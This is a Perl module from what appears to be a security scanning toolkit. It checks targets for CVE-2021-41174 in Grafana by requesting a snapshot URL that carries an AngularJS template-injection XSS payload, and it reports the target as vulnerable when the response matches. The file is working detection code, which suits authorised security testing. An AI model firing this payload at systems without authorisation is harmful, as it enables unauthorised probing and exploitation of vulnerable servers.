package Spellbook::Advisory::CVE_2021_41174 {
    use strict;
    use warnings;
    use Getopt::Long;
    use Spellbook::Core::UserAgent;
    use Readonly;

    our $VERSION = '0.0.1';

    Readonly my $HTTP_OK => 200;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @result);

        my $parser = Getopt::Long::Parser -> new (
            config => [qw(no_ignore_case pass_through)]
        );

        $parser -> getoptionsfromarray (
            $parameters,
            'h|help'     => \$help,
            't|target=s' => \$target
        );

        if ($target) {
            if ($target !~ /^https?:\/\//xsm) {
                $target = "https://$target";
            }

            if ($target =~ /\/$/xsm) {
                chop $target;
            }

            my $useragent = Spellbook::Core::UserAgent -> new();
            my $snapshot_payload = 'dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1';
            my $request = $useragent -> get ("$target/$snapshot_payload");

            if (($request -> code() == $HTTP_OK) && ($request -> content() =~ /Grafana/xsm)) {
                push @result, $target;
            }

            return @result;
        }

        if ($help) {
            return
                "\n"
              . "                \rAdvisory::CVE_2021_41174\n"
              . "                \r========================\n"
              . "                \r-h, --help     See this menu\n"
              . "                \r-t, --target   Define a target\n\n\n";
        }

        return 0;
    }
}

1;
